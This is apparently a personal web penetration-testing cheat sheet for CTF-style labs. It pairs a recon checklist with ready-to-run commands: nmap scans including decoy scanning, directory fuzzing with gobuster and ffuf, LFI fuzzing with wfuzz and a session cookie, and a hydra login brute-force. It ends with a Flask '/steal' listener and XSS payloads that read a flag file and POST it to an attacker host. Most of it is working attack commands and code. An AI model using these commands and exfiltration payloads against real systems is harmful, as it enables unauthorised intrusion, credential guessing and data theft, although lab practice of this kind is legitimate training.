
- [ ] Dorking needed? 
- [ ] Nmap targert address
- [ ] Robots.txt? sitemap.xml
- [ ] Case Sensitive 
- [ ] Gobuster root directory
- [ ] Gobuster main parent directory's
- [ ] Gobuster with common file extensions 
- [ ] Fuzz sub directories? 
- [ ] Inject points?
- [ ] Injection type SQL, NoSQL, XML, XXE, Server-side template
- [ ] Brute forcing? 
- [ ] List Frameworks?
- [ ] Authentication type?
- [ ] Source code comments, scripts, folders in links not found in GoBuster
- [ ] Source code interesting findings, points of XSS? 
- [ ] Path traversal?
- [ ] Cookies? what session auth e.g JWT? 
- [ ] Points of Access control vulnerabilities?
- [ ] Business logic vulnerabilities?
- [ ] Security cookies / Headers?  
- [ ] HTTP Host Header, Smuggling, Cache poisoning


Copy replace the following 
```
<host>  ip or hostname
<port> (default ports? use 80 for http and 443 for https)
<protocol> (http or https)
```
Detect service versions:
```
nmap -sV <host>
```

All ports
```
nmap -p- -sV <host>
```

Aggressive scan (OS, version, script scan, traceroute)
```
sudo nmap -A <host>
```

Scan using a decoy IP
```
sudo nmap -D 192.168.1.100 <host>
```

Gobuster with common files
```
gobuster dir -u http://ip/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
```

ffuf with common files + proxy 
```
ffuf -u http://<host>:<port>/FUZZ -w /usr/share/wordlists/dirb/common.txt -x <protocol>://10.10.113.249:8080 -e .php,.html,.txt,.js
```

Build wordlist off website words, make lowercase and uppercase, also uppercase first letter then remove duplicates.
```
cewl <protocol>://<host>:<port> -d 10 -m 4 -w wordlist.txt  

awk '{print $0; print tolower($0); print toupper($0); print toupper(substr($0,1,1)) tolower(substr($0,2))}' wordlist.txt | LC_ALL=C sort | uniq > wordlist_all_cases.txt

```

Scanning for LFI, with cookie, 
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Fuzzing/LFI/LFI-Jhaddix.txt

wfuzz -c -z file,LFI-Jhaddix.txt --hc 404 --hl 0 -H "Cookie: PHPSESSID=31btcd0pvfvkehu4gm7cc7ocvk" <protocol>://<host>:<port>/profile.php?img=FUZZ

```

Username Emulation
```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/Names/names.txt

hydra -L names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=password123:Wrong" 
```

Flask server to assist XSS (Cross-Site Scripting) / Open Redirect 

```
nano flaskserverpost.py
```

```
from flask import Flask, request

app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal():
    data = request.data.decode('utf-8')  # Read raw POST data
    print(f"Stolen Data: {data}")
    return "Data received", 200

if __name__ == '__main__':
    app.run(host='10.4.114.252', port=5000)

```

Test JavaScript
```
<script>fetch("http://10.4.114.252:5000/steal", {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: "test_post"
});</script>
```

Example JavaScript 
```
<script>
fetch("http://10.10.138.151:8080/flag.txt")
  .then(r => r.text())
  .then(d => { console.log(d); return fetch("http://10.4.114.252:5000/steal", {method: "POST", headers: {"Content-Type": "text/plain"}, body: d}); });
</script>
```

